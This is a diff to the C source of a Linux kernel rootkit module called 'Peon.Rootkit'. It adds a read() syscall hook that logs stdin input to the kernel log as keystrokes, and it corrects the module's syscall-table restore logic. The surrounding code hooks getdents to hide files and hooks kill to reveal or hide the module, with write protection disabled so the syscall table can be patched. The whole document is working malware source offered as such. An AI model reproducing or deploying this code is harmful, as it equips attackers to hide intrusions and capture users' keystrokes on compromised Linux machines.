@@ -106,11 +106,21 @@ if(OS_64_BITS)
 /* Adress of the syscall table */
 unsigned long ** syscall_table ;
 
+char FIRST_SHOW_MODULE = 1;
 /* save packet type */
 struct packet_type pt;
 
 /* save module */
  struct module *mod;
+    
+asmlinkage long (*orig_read_call)(int fd, void *buf, size_t count); 
+asmlinkage long hook_read_call(int fd, void *buf, size_t count){
+	
+	if (fd==0)
+	printk(KERN_ALERT "Peon.Rootkit: keyboard %s",(char*)buf);
+
+	return orig_read_call( fd, buf, count);
+} 
     
 /* -------------------------- 64 bits getdents version ------------------------------------------ */
 
@@ -121,7 +131,7 @@ asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *di
 	{
 
 	unsigned long off = 0;
-	struct linux_dirent __user *dir;	
+	struct linux_dirent64 __user *dir;	
 
 /* list directory  and hide files containing name _root_ */
 	for(off=0;off<ret;){
@@ -192,8 +202,8 @@ asmlinkage long kill_hook_call( pid_t pid, int sig)
     }
     
 /*   show hided module  kill -22 22*/    
-    if((sig ==22) &&(pid==22))
-    {  
+    if((sig ==22) &&(pid==22) && FIRST_SHOW_MODULE){  
+    FIRST_SHOW_MODULE=0;
 /*  attach save module to the list of module by seaching snd module */    	
     list_add(&mod->list,&find_module("snd")->list);    
     printk(KERN_ALERT "Peon.Rootkit: show module");
@@ -230,21 +240,28 @@ int init_module(void)
     
     disable_wp();
 
-/*  Save the adress of the original syscall */
+/*  Save the adress of the original kill syscall */
    kill_orig_call= (void *) syscall_table[__NR_kill];
    
 /*  Replace the syscall in the table */
   syscall_table[__NR_kill] = (void*) kill_hook_call;
   
+/*  Save the adress of the original read syscall */
+  orig_read_call= (void *) syscall_table[__NR_read];
+   
+/*  Replace the syscall in the table */
+  syscall_table[__NR_read] = (void*) hook_read_call;
+  
   if(OS_64_BITS){	
-/*  Save the adress of the original syscall */
+/*  Save the adress of the original getdents syscall */
   orig_getdents= (void *) syscall_table[__NR_getdents];
    
 /*  Replace the syscall in the table */
   syscall_table[__NR_getdents] = (void*) hacked_getdents;
+  
  }
  else{
- /*  Save the adress of the original syscall */
+ /*  Save the adress of the original getdents64 syscall */
   orig_getdents64= (void *) syscall_table[__NR_getdents64];
    
 /*  Replace the syscall in the table */
@@ -277,10 +294,12 @@ void cleanup_module(void)
     /* Set the orignal call*/
   syscall_table[/*  Sycall Number*/ __NR_kill] = (void*) kill_orig_call;
   
+ 	syscall_table[__NR_read] = (void*) orig_read_call;
+  
     if(OS_64_BITS)
-  	syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
+  	syscall_table[ __NR_getdents] = (void*) orig_getdents;
     else
-	syscall_table[ __NR_getdents] = (void*) orig_getdents;
+	syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
 	 
     enable_wp(); 
 
